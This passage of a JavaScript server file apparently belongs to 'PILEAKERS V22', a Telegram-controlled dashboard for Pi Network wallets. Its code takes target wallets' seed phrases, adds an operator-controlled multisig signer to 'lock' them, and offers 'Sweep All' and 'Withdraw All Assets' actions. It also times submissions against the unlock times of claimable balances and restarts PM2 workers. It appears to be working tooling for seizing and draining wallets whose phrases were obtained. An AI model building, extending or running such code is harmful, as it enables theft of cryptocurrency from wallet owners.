        const prepared = await Promise.all(batch.map((publicKey, offset) => prepareTargetAction(publicKey, batchIndex * batchSize + offset)));
        const actions = [];
        for (const item of prepared) {
            if (item.ok) {
                actions.push(item.action);
            } else {
                results.push({ ...item.result, batch_no: batchNo });
            }
        }

        await submitActionBatch(actions, batchNo);

        await reportProgress({
            stage: "batch_done",
            batch_no: batchNo,
            batch_count: targetBatches.length,
            batch_size: batch.length,
            batch_mode: "parallel_isolated_wallet",
            total: targets.length,
            valid: targets.length,
            success: results.filter((item) => item.success).length,
            failed: results.filter((item) => !item.success && !item.stopped).length,
            stopped: results.filter((item) => item.stopped).length || undefined,
            processed: results.length,
            batch_delay_ms: batchDelayMs,
        });

        if (isStopRequested()) {
            break;
        }
        if (batchIndex < targetBatches.length - 1 && batchDelayMs > 0) {
            await reportProgress({
                stage: "delay",
                batch_no: batchNo,
                batch_count: targetBatches.length,
                total: targets.length,
                success: results.filter((item) => item.success).length,
                failed: results.filter((item) => !item.success && !item.stopped).length,
                stopped: results.filter((item) => item.stopped).length || undefined,
                processed: results.length,
                batch_delay_ms: batchDelayMs,
            });
        }
        const stoppedDuringDelay = await waitMultisigBatchDelayWithStop(batchIndex, targetBatches.length, batchDelayMs, `Multisig ${mode}`, isStopRequested);
        if (stoppedDuringDelay) {
            break;
        }
    }

    if (isStopRequested()) {
        for (let index = 0; index < targets.length; index += 1) {
            if (!results.some((item) => Number(item.index || 0) === index + 1)) {
                results.push({
                    index: index + 1,
                    success: false,
                    stopped: true,
                    public_key: targets[index],
                    error: "Dihentikan oleh admin sebelum diproses",
                });
            }
        }
        await reportProgress({
            stage: "stopped",
            total: targets.length,
            valid: targets.length,
            success: results.filter((item) => item.success).length,
            failed: results.filter((item) => !item.success && !item.stopped).length,
            stopped: results.filter((item) => item.stopped).length,
            processed: results.length,
            batch_count: targetBatches.length,
        });
    } else {
        await reportProgress({
            stage: "completed",
            total: targets.length,
            valid: targets.length,
            success: results.filter((item) => item.success).length,
            failed: results.filter((item) => !item.success && !item.stopped).length,
            processed: results.length,
            batch_count: targetBatches.length,
        });
    }

    results.sort((a, b) => (a.index || a.line || 0) - (b.index || b.line || 0));

    return {
        funding_public_key: fundingPublicKey,
        funding_wallet_id: fundingInfo.wallet_id,
        funding_wallet_name: fundingInfo.wallet_name,
        signer_public_key: signerPublicKey,
        signer_wallet_id: signerInfo.signer_id || null,
        signer_wallet_name: signerInfo.signer_name || null,
        network,
        horizon_url: horizonUrl,
        horizon_urls: horizonUrls,
        mode,
        batch_size: batchSize,
        batch_mode: "parallel_isolated_wallet",
        batch_delay_ms: batchDelayMs,
        batch_count: targetBatches.length,
        total: results.length,
        success_count: results.filter((item) => item.success).length,
        failed_count: results.filter((item) => !item.success && !item.stopped).length,
        stopped: results.some((item) => item.stopped),
        stopped_count: results.filter((item) => item.stopped).length,
        results,
    };
}

async function previewMultisigTargets(input) {
    const fundingInfo = await getMultisigFundingKeypair(input);
    const fundingPublicKey = fundingInfo.public_key;
    const signerInfo = await getMultisigSignerPublic(input);
    const signerPublicKey = signerInfo.public_key;
    const { network } = await resolveMultisigNetworkConfig(input);
    const mode = String(input.mode || "install_lock").trim();
    const stored = await listMultisigLockedWallets();
    const storedByPublicKey = new Map(
        stored
            .filter((row) => row.network === network && row.funding_public_key === fundingPublicKey && String(row.signer_public_key || row.funding_public_key || "") === signerPublicKey)
            .map((row) => [String(row.public_key || ""), row])
    );

    let rawLines = [];
    let usingStored = false;
    if (mode === "install_lock") {
        rawLines = normalizeMultisigLines(input.target_phrases);
    } else {
        rawLines = normalizeMultisigLines(input.target_public_keys);
        if (!rawLines.length) {
            usingStored = true;
            rawLines = stored
                .filter((row) =>
                    row.network === network &&
                    row.funding_public_key === fundingPublicKey &&
                    String(row.signer_public_key || row.funding_public_key || "") === signerPublicKey &&
                    String(row.status || "") !== "signer_removed"
                )
                .map((row) => row.public_key);
        }
    }

    const results = [];
    for (let index = 0; index < rawLines.length; index += 1) {
        const value = String(rawLines[index] || "").trim();
        try {
            let publicKey = value;
            let source = usingStored ? "saved" : "public_key";
            if (mode === "install_lock") {
                const targetKeypair = deriveKeypairFromMnemonic(value);
                publicKey = targetKeypair.publicKey();
                source = "phrase";
                if (publicKey === fundingPublicKey) {
                    throw new Error("Funding wallet tidak boleh masuk ke target");
                }
                if (publicKey === signerPublicKey) {
                    throw new Error("Signer wallet tidak boleh masuk ke target");
                }
            } else {
                StellarKeypair.fromPublicKey(publicKey);
            }
            const saved = storedByPublicKey.get(publicKey) || null;
            results.push({
                line: index + 1,
                success: true,
                public_key: publicKey,
                source,
                network,
                funding_public_key: fundingPublicKey,
                signer_public_key: signerPublicKey,
                saved_status: saved?.status || "not_saved",
                updated_at: saved?.updated_at || null,
            });
        } catch (err) {
            results.push({ line: index + 1, success: false, source: mode === "install_lock" ? "phrase" : "public_key", error: err.message || String(err) });
        }
    }

    return {
        funding_public_key: fundingPublicKey,
        funding_wallet_id: fundingInfo.wallet_id,
        funding_wallet_name: fundingInfo.wallet_name,
        signer_public_key: signerPublicKey,
        signer_wallet_id: signerInfo.signer_id || null,
        signer_wallet_name: signerInfo.signer_name || null,
        network,
        mode,
        using_stored: usingStored,
        total: results.length,
        success_count: results.filter((item) => item.success).length,
        results,
    };
}

function formatUtcDateTime(date) {
    const yyyy = date.getUTCFullYear();
    const mm = String(date.getUTCMonth() + 1).padStart(2, "0");
    const dd = String(date.getUTCDate()).padStart(2, "0");
    const hh = String(date.getUTCHours()).padStart(2, "0");
    const min = String(date.getUTCMinutes()).padStart(2, "0");
    const ss = String(date.getUTCSeconds()).padStart(2, "0");
    return `${yyyy}-${mm}-${dd} ${hh}:${min}:${ss}`;
}

async function fetchClaimableBalances(publicKey, network = "mainnet") {
    const apiUrl =
        String(network).toLowerCase() === "testnet"
            ? "https://api.testnet.minepi.com"
            : "https://api.mainnet.minepi.com";
    let url = `${apiUrl}/claimable_balances?claimant=${encodeURIComponent(publicKey)}&limit=${CLAIMABLE_BALANCE_PAGE_LIMIT}&order=asc`;
    const records = [];
    const seenUrls = new Set();

    while (url && records.length < CLAIMABLE_BALANCE_FETCH_LIMIT && !seenUrls.has(url)) {
        seenUrls.add(url);
        const response = await axios.get(url, { timeout: 15000 });
        const pageRecords = response.data?._embedded?.records || [];
        records.push(...pageRecords);

        if (pageRecords.length < CLAIMABLE_BALANCE_PAGE_LIMIT) {
            break;
        }

        url = response.data?._links?.next?.href || null;
    }

    return records.slice(0, CLAIMABLE_BALANCE_FETCH_LIMIT).map((record) => {
        const claimant = (record.claimants || []).find((item) => item.destination === publicKey);
        let unlockTime = "Immediately";

        if (claimant?.predicate) {
            const pred = claimant.predicate;
            if (pred.not?.abs_before) {
                const ts = new Date(pred.not.abs_before);
                // Simpan waktu asli UTC dari Horizon. Timezone admin hanya dipakai saat display/input,
                // bukan mengikuti timezone VPS.
                unlockTime = formatUtcDateTime(ts);
            } else if (pred.abs_before) {
                const ts = new Date(pred.abs_before);
                unlockTime = `Before ${formatUtcDateTime(ts)}`;
            }
        }

        return {
            id: record.id,
            amount: Number.parseFloat(record.amount).toFixed(7),
            asset: record.asset === "native" ? "PI" : record.asset || "",
            sponsor: record.sponsor || "",
            last_modified_ledger: record.last_modified_ledger || null,
            last_modified_time: record.last_modified_time || "",
            unlock_time: unlockTime,
            unlock_time_utc: claimant?.predicate?.not?.abs_before || "",
            paging_token: record.paging_token || "",
        };
    });
}

async function loadData(key) {
    try {
        if (!redisClient.isOpen) {
            return [];
        }
        const data = await redisClient.get(key);
        return data ? JSON.parse(data) : [];
    } catch (err) {
        console.log(`Error reading from Redis key ${key}: ${err.message}`);
        return [];
    }
}

async function saveData(key, data) {
    try {
        if (!redisClient.isOpen) {
            return;
        }
        await redisClient.set(key, JSON.stringify(data));
    } catch (err) {
        console.log(`Error writing to Redis key ${key}: ${err.message}`);
    }
}

async function loadJsonObject(key, fallback = {}) {
    try {
        if (!redisClient.isOpen) {
            return { ...fallback };
        }
        const data = await redisClient.get(key);
        if (!data) {
            return { ...fallback };
        }
        const parsed = JSON.parse(data);
        return parsed && typeof parsed === "object" && !Array.isArray(parsed)
            ? { ...fallback, ...parsed }
            : { ...fallback };
    } catch (err) {
        console.log(`Error reading Redis object ${key}: ${err.message}`);
        return { ...fallback };
    }
}

async function saveJsonObject(key, data) {
    try {
        if (!redisClient.isOpen) {
            return;
        }
        await redisClient.set(key, JSON.stringify(data));
    } catch (err) {
        console.log(`Error writing Redis object ${key}: ${err.message}`);
    }
}

function execFilePromise(command, args = [], options = {}) {
    return new Promise((resolve, reject) => {
        execFile(command, args, {
            cwd: __dirname,
            env: { ...process.env, ...(options.env || {}) },
            timeout: options.timeout || 30000,
            windowsHide: true,
        }, (error, stdout, stderr) => {
            if (error) {
                error.stdout = stdout;
                error.stderr = stderr;
                return reject(error);
            }
            return resolve({ stdout: String(stdout || ""), stderr: String(stderr || "") });
        });
    });
}

async function runPm2Command(args, options = {}) {
    return execFilePromise("pm2", args, options);
}

function normalizePm2WorkerName(name) {
    const text = String(name || "worker").trim().toLowerCase();
    const slug = text.replace(/[^a-z0-9_-]+/g, "-").replace(/^-+|-+$/g, "") || "worker";
    return `${PM2_WORKER_NAME_PREFIX}${slug.replace(/^worker-?/i, "")}`;
}

function readBumpSponsorsRaw() {
    try {
        if (!fs.existsSync(BUMP_FILE_PATH)) {
            fs.writeFileSync(BUMP_FILE_PATH, "", { mode: 0o600 });
            return [];
        }
        return fs.readFileSync(BUMP_FILE_PATH, "utf8")
            .replace(/\r/g, "")
            .split("\n")
            .map((line) => line.trim())
            .filter((line) => line && !line.startsWith("#"));
    } catch (err) {
        console.log(`Gagal membaca bump.txt: ${err.message}`);
        return [];
    }
}

function saveBumpSponsorsRaw(lines) {
    const unique = [];
    const seen = new Set();
    for (const line of lines || []) {
        const text = String(line || "").trim();
        if (!text || seen.has(text)) {
            continue;
        }
        seen.add(text);
        unique.push(text);
    }
    fs.writeFileSync(BUMP_FILE_PATH, `${unique.join("\n")}${unique.length ? "\n" : ""}`, { mode: 0o600 });
    try { fs.chmodSync(BUMP_FILE_PATH, 0o600); } catch (_) {}
    return unique;
}

function parseBumpInputLines(text) {
    const seen = new Set();
    const lines = [];
    for (const raw of String(text || "").replace(/\r/g, "").split("\n")) {
        const line = raw.trim();
        if (!line || line.startsWith("#") || seen.has(line)) {
            continue;
        }
        seen.add(line);
        lines.push(line);
    }
    return lines;
}

async function listBumpWallets() {
    const lines = readBumpSponsorsRaw();
    return lines.map((mnemonic, index) => {
        try {
            const publicKey = derivePublicKeyFromMnemonic(mnemonic);
            return { index, public_key: publicKey, short_public_key: shortKey(publicKey, 8), valid: true };
        } catch (err) {
            return { index, public_key: "", short_public_key: `invalid-${index + 1}`, valid: false, error: err.message };
        }
    });
}

async function restartPm2WorkersAfterBumpChange(reason = "bump.txt updated") {
    try {
        const workers = await listWorkers().catch(() => []);
        const targets = workers.length
            ? workers.map((worker) => worker.pm2_name || normalizePm2WorkerName(worker.name))
            : ["worker-1", "worker-2", "worker-3", "worker-4", "worker-5"];
        let restarted = 0;
        for (const target of targets) {
            try {
                await runPm2Command(["restart", target, "--update-env"], { timeout: 60000 });
                restarted += 1;
            } catch (_) {
                // Worker mungkin belum ada di PM2, skip supaya add/delete bump tetap sukses.
            }
        }
        if (PM2_AUTO_SAVE) {
            await runPm2Command(["save"], { timeout: 30000 }).catch(() => null);
        }
        broadcastLog(`🔁 ${restarted}/${targets.length} Worker PM2 direstart karena ${reason}; bump.txt dimuat ulang.`, "success");
        return true;
    } catch (err) {
        broadcastLog(`⚠️ Gagal restart worker PM2 setelah update bump.txt: ${err.message}`, "warning");
        return false;
    }
}

async function addBumpSponsorsFromText(text) {
    const inputLines = parseBumpInputLines(text);
    if (!inputLines.length) {
        throw new Error("bump.txt kosong. Kirim phrase per baris atau upload file .txt.");
    }
    const current = readBumpSponsorsRaw();
    const currentSet = new Set(current);
    const added = [];
    const failed = [];
    for (const line of inputLines) {
        try {
            derivePublicKeyFromMnemonic(line);
            if (!currentSet.has(line)) {
                currentSet.add(line);
                current.push(line);
                added.push(line);
            }
        } catch (err) {
            failed.push({ line, error: err.message });
        }
    }
    saveBumpSponsorsRaw(current);
    if (added.length) {
        await restartPm2WorkersAfterBumpChange(`${added.length} wallet bump ditambahkan`);
    }
    return { total_input: inputLines.length, added: added.length, duplicate: inputLines.length - added.length - failed.length, failed: failed.length };
}

async function deleteBumpSponsorByIndex(index) {
    const sponsors = readBumpSponsorsRaw();
    const numericIndex = Number.parseInt(index, 10);
    if (!Number.isSafeInteger(numericIndex) || numericIndex < 0 || numericIndex >= sponsors.length) {
        return false;
    }
    sponsors.splice(numericIndex, 1);
    saveBumpSponsorsRaw(sponsors);
    await restartPm2WorkersAfterBumpChange("1 wallet bump dihapus");
    return true;
}

async function clearAllBumpSponsors() {
    const count = readBumpSponsorsRaw().length;
    saveBumpSponsorsRaw([]);
    await restartPm2WorkersAfterBumpChange("bump.txt dikosongkan");
    return count;
}

function normalizeTelegramSettings(settings) {
    return {
        telegram_bot_token: String(settings?.telegram_bot_token || "").trim(),
        telegram_chat_id: String(settings?.telegram_chat_id || "").trim(),
    };
}

async function getSettings() {
    const stored = await loadJsonObject(SETTINGS_KEY, {});
    const storedTelegram = normalizeTelegramSettings(stored);
    const defaultTelegram = normalizeTelegramSettings(DEFAULT_TELEGRAM_SETTINGS);
    const merged = {
        ...stored,
        telegram_bot_token: storedTelegram.telegram_bot_token || defaultTelegram.telegram_bot_token,
        telegram_chat_id: storedTelegram.telegram_chat_id || defaultTelegram.telegram_chat_id,
    };

    if (
        (!storedTelegram.telegram_bot_token && defaultTelegram.telegram_bot_token) ||
        (!storedTelegram.telegram_chat_id && defaultTelegram.telegram_chat_id)
    ) {
        await saveJsonObject(SETTINGS_KEY, {
            ...merged,
            updated_at: stored.updated_at || utcIso(),
        });
    }

    return merged;
}

function maskSecret(value) {
    const text = String(value || "");
    if (!text) {
        return "";
    }
    if (text.length <= 10) {
        return "configured";
    }
    return `${text.slice(0, 6)}...${text.slice(-4)}`;
}

function normalizeSubmitBeforeMs(value, fallback = DEFAULT_SUBMIT_BEFORE_MS) {
    const parsed = Number.parseInt(value, 10);
    const base = Number.isFinite(parsed) ? parsed : fallback;
    return Math.min(Math.max(base, SUBMIT_BEFORE_MS_MIN), SUBMIT_BEFORE_MS_MAX);
}

function publicTelegramSettings(settings) {
    const normalized = normalizeTelegramSettings(settings);
    return {
        has_bot_token: Boolean(normalized.telegram_bot_token),
        masked_bot_token: maskSecret(normalized.telegram_bot_token),
        telegram_chat_id: normalized.telegram_chat_id,
        updated_at: settings?.updated_at || null,
    };
}

function normalizeSubmitEndpointMode(value, fallback = DEFAULT_SUBMIT_ENDPOINT_MODE) {
    const normalized = String(value ?? fallback).trim().toLowerCase();
    return normalized === "sync" ? "sync" : "async";
}

function publicCallSubmitSettings(settings) {
    return {
        submit_before_ms: normalizeSubmitBeforeMs(settings?.submit_before_ms),
        submit_before_ms_min: SUBMIT_BEFORE_MS_MIN,
        submit_before_ms_max: SUBMIT_BEFORE_MS_MAX,
        submit_endpoint_mode: normalizeSubmitEndpointMode(settings?.submit_endpoint_mode),
        updated_at: settings?.updated_at || null,
    };
}

async function saveTelegramSettings(input) {
    const current = await getSettings();
    const currentTelegram = normalizeTelegramSettings(current);
    const hasTokenInput = Object.prototype.hasOwnProperty.call(input || {}, "telegram_bot_token");
    const hasChatInput = Object.prototype.hasOwnProperty.call(input || {}, "telegram_chat_id");
    const tokenInput = hasTokenInput ? String(input.telegram_bot_token || "").trim() : currentTelegram.telegram_bot_token;
    const chatInput = hasChatInput ? String(input.telegram_chat_id || "").trim() : currentTelegram.telegram_chat_id;
    const nextToken = tokenInput === "__KEEP__" ? currentTelegram.telegram_bot_token : tokenInput;
    const nextChatId = chatInput;

    if (!nextToken || !nextChatId) {
        throw new Error("Telegram bot token dan chat id wajib diisi");
    }

    const next = {
        ...current,
        telegram_bot_token: nextToken,
        telegram_chat_id: nextChatId,
        updated_at: utcIso(),
    };
    await saveJsonObject(SETTINGS_KEY, next);
    return next;
}

async function saveCallSubmitSettings(input) {
    const current = await getSettings();
    const parsedSubmitBeforeMs = Number.parseInt(input?.submit_before_ms, 10);
    if (!Number.isFinite(parsedSubmitBeforeMs) || parsedSubmitBeforeMs < SUBMIT_BEFORE_MS_MIN || parsedSubmitBeforeMs > SUBMIT_BEFORE_MS_MAX) {
        throw new Error(`SUBMIT_BEFORE_MS wajib angka ${SUBMIT_BEFORE_MS_MIN}-${SUBMIT_BEFORE_MS_MAX}`);
    }
    const submitEndpointMode = normalizeSubmitEndpointMode(input?.submit_endpoint_mode);

    const next = {
        ...current,
        submit_before_ms: parsedSubmitBeforeMs,
        submit_endpoint_mode: submitEndpointMode,
        updated_at: utcIso(),
    };
    await saveJsonObject(SETTINGS_KEY, next);
    return next;
}

const USER_TIMEZONE_OPTIONS = [-12, -11, -10, -9, -8, -7, -6, -5, -4, -3, -2, -1, 0, 1, 2, 3, 4, 5, 5.5, 6, 7, 8, 9, 9.5, 10, 11, 12];

function normalizeUserTimezone(value, fallback = 0) {
    const parsed = Number.parseFloat(String(value ?? fallback).trim());
    if (!Number.isFinite(parsed)) {
        return fallback;
    }
    return USER_TIMEZONE_OPTIONS.includes(parsed) ? parsed : fallback;
}

function formatTimezoneOffset(zone) {
    const normalized = normalizeUserTimezone(zone);
    const sign = normalized >= 0 ? "+" : "-";
    const absolute = Math.abs(normalized);
    const hours = Math.floor(absolute);
    const minutes = Math.round((absolute % 1) * 60);
    return minutes === 0 ? `UTC${sign}${hours}` : `UTC${sign}${hours}:${String(minutes).padStart(2, "0")}`;
}

function formatFundingHistoryTime(value, timezoneValue = 0) {
    const text = String(value || "").trim();
    if (!text || text === "-") {
        return "-";
    }
    const date = new Date(text);
    if (Number.isNaN(date.getTime())) {
        return text;
    }
    const timezone = normalizeUserTimezone(timezoneValue, 0);
    const shifted = new Date(date.getTime() + timezone * 60 * 60 * 1000);
    const yyyy = shifted.getUTCFullYear();
    const mm = String(shifted.getUTCMonth() + 1).padStart(2, "0");
    const dd = String(shifted.getUTCDate()).padStart(2, "0");
    const hh = String(shifted.getUTCHours()).padStart(2, "0");
    const mi = String(shifted.getUTCMinutes()).padStart(2, "0");
    const ss = String(shifted.getUTCSeconds()).padStart(2, "0");
    return `${yyyy}-${mm}-${dd} ${hh}:${mi}:${ss} ${formatTimezoneOffset(timezone)}`;
}

function publicTimezoneSettings(settings) {
    const userTimezone = normalizeUserTimezone(settings?.user_timezone, 0);
    return {
        user_timezone: userTimezone,
        label: formatTimezoneOffset(userTimezone),
        options: USER_TIMEZONE_OPTIONS,
        updated_at: settings?.updated_at || null,
    };
}

async function saveTimezoneSettings(input) {
    const current = await getSettings();
    const userTimezone = normalizeUserTimezone(input?.user_timezone, null);
    if (userTimezone === null) {
        throw new Error("Timezone tidak valid. Pilih UTC -12 sampai UTC +12.");
    }

    const next = {
        ...current,
        user_timezone: userTimezone,
        updated_at: utcIso(),
    };
    await saveJsonObject(SETTINGS_KEY, next);
    return next;
}

const TELEGRAM_LANGUAGE_OPTIONS = [
    { code: "id", label: "🇮🇩 Indonesia" },
    { code: "en", label: "🇬🇧 English" },
    { code: "ms", label: "🇲🇾 Melayu" },
];

const TELEGRAM_LANGUAGE_TEXT = {
    id: {
        settings: "⚙️ Settings",
        timezone: "🌍 Time Zone",
        server: "🖥️ Server",
        worker: "👷 Worker",
        funding: "💰 Funding",
        destination: "🎯 Wallet Tujuan",
        botTx: "🤖 Bot TX",
        multisig: "🔐 Multisig",
        checkLedger: "🔎 Check Ledger",
        fundingHistory: "📊 Riwayat Funding",
        liveLogs: "📜 Live Logs",
        language: "🌐 Bahasa",
        refresh: "🔄 Refresh",
        back: "⬅️ Kembali",
        mainMenu: "⬅️ Menu Utama",
        homeTitle: "🤖 PILEAKERS V22🤖",
        homeIntro: "Kontrol dashboard lewat Telegram.",
        languageTitle: "🌐 Pilih Bahasa",
        languageNow: "Bahasa sekarang",
        languagePrompt: "Pilih bahasa tampilan tombol dan pesan utama bot.",
        languageSaved: "✅ Bahasa disimpan",
        languageChanged: "✅ Bahasa berhasil diubah ke Indonesia! 🇮🇩",
        notSet: "belum diset",
        now: "Sekarang",
        currentLanguage: "Bahasa",
        fundingWalletLabel: "Funding Wallet",
        destinationWalletLabel: "Wallet Tujuan",
        chooseLanguageButton: "🌐 Pilih Bahasa",
        setTelegramButton: "🔑 Set Telegram Token/Chat",
        setSubmitBeforeButton: "⏱️ Set Submit Before MS",
        settingsTitle: "⚙️ Settings",
        timezoneTitle: "🌍 Pengaturan Time Zone",
        timezonePrompt: "Pilih timezone untuk default bot yang dibuat dari Telegram.",
        manageServers: "🖥️ Manage Servers",
        noServers: "Belum ada server.",
        addServer: "➕ Add Server",
        deleteServer: "🗑️ Delete Server",
        manageFunding: "💰 Funding Wallet",
        noFundingWallet: "Belum ada funding wallet.",
        addFunding: "➕ Add Funding",
        addFundingFirst: "➕ Add Funding dulu",
        deleteFunding: "🗑️ Delete Funding",
        publicKey: "Public",
        balance: "Saldo",
        id: "ID",
        manageDestinations: "🎯 Wallet Tujuan",
        noDestinations: "Belum ada wallet tujuan.",
        addDestination: "➕ Add Wallet Tujuan",
        deleteDestination: "🗑️ Delete Wallet Tujuan",
        manageWorkers: "👷 Manage Workers",
        noWorkers: "Belum ada worker.",
        unassigned: "Belum dipilih",
        addWorker: "➕ Add Worker",
        deleteWorker: "🗑️ Delete Worker",
        noBots: "Belum ada bot TX.",
        setNewBot: "➕ Set New Bot",
        advancedJson: "🧩 Advanced JSON",
        deleteBot: "🗑️ Delete Bot",
        moreBots: "bot lain",
        parent: "Parent",
        status: "Status",
        type: "Type",
        mode: "Mode",
        amount: "Amount",
        network: "Network",
        time: "Waktu",
        feeLoss: "Fee Loss",
        fundingHistoryTitle: "📊 Riwayat Mutasi Funding",
        totalMutations: "Total mutasi",
        totalLoss: "Total loss",
        noHistory: "Belum ada riwayat.",
        botGroup: "Bot/Group",
        workersLabel: "Workers",
        deducted: "Terpotong",
        ledgerTitle: "🔎 Check Ledger",
        ledgerIntro: "Fungsi ini sama seperti menu Check Ledger di web.",
        ledgerAutoInfo: "Auto Detect = bot ambil 10 ledger terakhir dari transaksi wallet.",
        ledgerManualInfo: "Manual Range = admin isi ledger start dan ledger end sendiri.",
        autoDetectLedger: "🔎 Auto Detect Ledger",
        manualLedgerRange: "✍️ Manual Ledger Range",
        logsTitle: "📜 Live Logs",
        logsIntro: "Menampilkan 40 log terakhir dari proses bot/worker.",
        noLogs: "Belum ada log.",
        refreshLogs: "🔄 Refresh Logs",
        multisigTitle: "🔐 Multisig Full Control",
        lockedWallet: "Locked wallet",
        pendingLock: "Pending lock",
        savedWalletList: "Saved Wallet List",
        savedWalletPhraseList: "Saved Wallet Phrase List",
        saveWalletList: "💾 Save Wallet List",
        runSavedBatch: "🚀 Run Saved Batch",
        manageSavedWallets: "📦 List Wallet Tersimpan",
        deleteAllSavedWallets: "🗑️ Hapus All Wallet",
        addSavedWallet: "➕ Save Wallet",
        noSavedWallet: "Belum ada wallet tersimpan.",
        savedWalletIntro: "Phrase disimpan terenkripsi dan tidak akan terhapus setelah Run Batch.",
        deleteOneByOne: "Hapus satu per satu",
        defaultTimezone: "Default timezone",
        multisigIntro: "Semua operasi dijalankan dari Telegram berdasarkan Chat ID admin.",
        runSetMode: "➕ Run / Set Mode",
        withdrawAllAssets: "💸 Tarik Semua Aset",
        sweepAll: "🧹 Sweep All",
        removeAllSigner: "🧹 Hapus All Signer",
        locked: "📋 Locked",
        pending: "⏳ Pending",
        protocolMainnet: "🧭 Protocol Mainnet",
        protocolTestnet: "🧪 Protocol Testnet",
        openingHome: "Membuka menu utama...",
        chatNotAllowed: "Chat tidak diizinkan",
        typeMenuHint: "Ketik /menu untuk membuka tombol kontrol.",
        inputCancelled: "Input dibatalkan.",
    },
    en: {
        settings: "⚙️ Settings",
        timezone: "🌍 Time Zone",
        server: "🖥️ Server",
        worker: "👷 Worker",
        funding: "💰 Funding",
        destination: "🎯 Destination Wallet",
        botTx: "🤖 TX Bot",
        multisig: "🔐 Multisig",
        checkLedger: "🔎 Check Ledger",
        fundingHistory: "📊 Funding History",
        liveLogs: "📜 Live Logs",
        language: "🌐 Language",
        refresh: "🔄 Refresh",
        back: "⬅️ Back",
        mainMenu: "⬅️ Main Menu",
        homeTitle: "🤖 PILEAKERS V22🤖",
        homeIntro: "Control the dashboard from Telegram.",
        languageTitle: "🌐 Choose Language",
        languageNow: "Current language",
        languagePrompt: "Choose the language for main bot buttons and messages.",
        languageSaved: "✅ Language saved",
        languageChanged: "✅ Language changed to English! 🇬🇧",
        notSet: "not set",
        now: "Current",
        currentLanguage: "Language",
        fundingWalletLabel: "Funding Wallet",
        destinationWalletLabel: "Destination Wallet",
        chooseLanguageButton: "🌐 Choose Language",
        setTelegramButton: "🔑 Set Telegram Token/Chat",
        setSubmitBeforeButton: "⏱️ Set Submit Before MS",
        settingsTitle: "⚙️ Settings",
        timezoneTitle: "🌍 Time Zone Settings",
        timezonePrompt: "Choose the default timezone for bots created from Telegram.",
        manageServers: "🖥️ Manage Servers",
        noServers: "No servers yet.",
        addServer: "➕ Add Server",
        deleteServer: "🗑️ Delete Server",
        manageFunding: "💰 Funding Wallet",
        noFundingWallet: "No funding wallet yet.",
        addFunding: "➕ Add Funding",
        addFundingFirst: "➕ Add Funding first",
        deleteFunding: "🗑️ Delete Funding",
        publicKey: "Public",
        balance: "Balance",
        id: "ID",
        manageDestinations: "🎯 Destination Wallets",
        noDestinations: "No destination wallets yet.",
        addDestination: "➕ Add Destination Wallet",
        deleteDestination: "🗑️ Delete Destination Wallet",
        manageWorkers: "👷 Manage Workers",
        noWorkers: "No workers yet.",
        unassigned: "Unassigned",
        addWorker: "➕ Add Worker",
        deleteWorker: "🗑️ Delete Worker",
        noBots: "No TX bots yet.",
        setNewBot: "➕ Set New Bot",
        advancedJson: "🧩 Advanced JSON",
        deleteBot: "🗑️ Delete Bot",
        moreBots: "more bots",
        parent: "Parent",
        status: "Status",
        type: "Type",
        mode: "Mode",
        amount: "Amount",
        network: "Network",
        time: "Time",
        feeLoss: "Fee Loss",
        fundingHistoryTitle: "📊 Funding Mutation History",
        totalMutations: "Total mutations",
        totalLoss: "Total loss",
        noHistory: "No history yet.",
        botGroup: "Bot/Group",
        workersLabel: "Workers",
        deducted: "Deducted",
        ledgerTitle: "🔎 Check Ledger",
        ledgerIntro: "This works like the Check Ledger menu on the web dashboard.",
        ledgerAutoInfo: "Auto Detect = the bot reads the last 10 ledgers from the wallet transactions.",
        ledgerManualInfo: "Manual Range = admin enters start ledger and end ledger manually.",
        autoDetectLedger: "🔎 Auto Detect Ledger",
        manualLedgerRange: "✍️ Manual Ledger Range",
        logsTitle: "📜 Live Logs",
        logsIntro: "Showing the latest 40 logs from bot/worker processes.",
        noLogs: "No logs yet.",
        refreshLogs: "🔄 Refresh Logs",
        multisigTitle: "🔐 Multisig Full Control",
        lockedWallet: "Locked wallet",
        pendingLock: "Pending lock",
        savedWalletList: "Saved Wallet List",
        savedWalletPhraseList: "Saved Wallet Phrase List",
        saveWalletList: "💾 Save Wallet List",
        runSavedBatch: "🚀 Run Saved Batch",
        manageSavedWallets: "📦 Saved Wallet List",
        deleteAllSavedWallets: "🗑️ Delete All Wallets",
        addSavedWallet: "➕ Save Wallet",
        noSavedWallet: "No saved wallets yet.",
        savedWalletIntro: "Phrases are stored encrypted and will not be deleted after Run Batch.",
        deleteOneByOne: "Delete one by one",
        defaultTimezone: "Default timezone",
        multisigIntro: "All operations run from Telegram based on the admin Chat ID.",
        runSetMode: "➕ Run / Set Mode",
        withdrawAllAssets: "💸 Withdraw All Assets",
        sweepAll: "🧹 Sweep All",
        removeAllSigner: "🧹 Remove All Signers",
        locked: "📋 Locked",
        pending: "⏳ Pending",
        protocolMainnet: "🧭 Mainnet Protocol",
        protocolTestnet: "🧪 Testnet Protocol",
        openingHome: "Opening main menu...",
        chatNotAllowed: "Chat is not allowed",
        typeMenuHint: "Type /menu to open the control buttons.",
        inputCancelled: "Input cancelled.",
    },
    ms: {
        settings: "⚙️ Tetapan",
        timezone: "🌍 Zon Masa",
        server: "🖥️ Server",
        worker: "👷 Worker",
        funding: "💰 Funding",
        destination: "🎯 Wallet Tujuan",
        botTx: "🤖 Bot TX",
        multisig: "🔐 Multisig",
        checkLedger: "🔎 Semak Ledger",
        fundingHistory: "📊 Sejarah Funding",
        liveLogs: "📜 Live Logs",
        language: "🌐 Bahasa",
        refresh: "🔄 Refresh",
        back: "⬅️ Kembali",
        mainMenu: "⬅️ Menu Utama",
        homeTitle: "🤖 PILEAKERS V22🤖",
        homeIntro: "Kawal dashboard melalui Telegram.",
        languageTitle: "🌐 Pilih Bahasa",
        languageNow: "Bahasa semasa",
        languagePrompt: "Pilih bahasa untuk butang utama dan mesej bot.",
        languageSaved: "✅ Bahasa disimpan",
        languageChanged: "✅ Bahasa berjaya ditukar ke Melayu! 🇲🇾",
        notSet: "belum ditetapkan",
        now: "Sekarang",
        currentLanguage: "Bahasa",
        fundingWalletLabel: "Wallet Funding",
        destinationWalletLabel: "Wallet Tujuan",
        chooseLanguageButton: "🌐 Pilih Bahasa",
        setTelegramButton: "🔑 Tetapkan Telegram Token/Chat",
        setSubmitBeforeButton: "⏱️ Tetapkan Submit Before MS",
        settingsTitle: "⚙️ Tetapan",
        timezoneTitle: "🌍 Tetapan Zon Masa",
        timezonePrompt: "Pilih zon masa lalai untuk bot yang dibuat daripada Telegram.",
        manageServers: "🖥️ Urus Server",
        noServers: "Belum ada server.",
        addServer: "➕ Tambah Server",
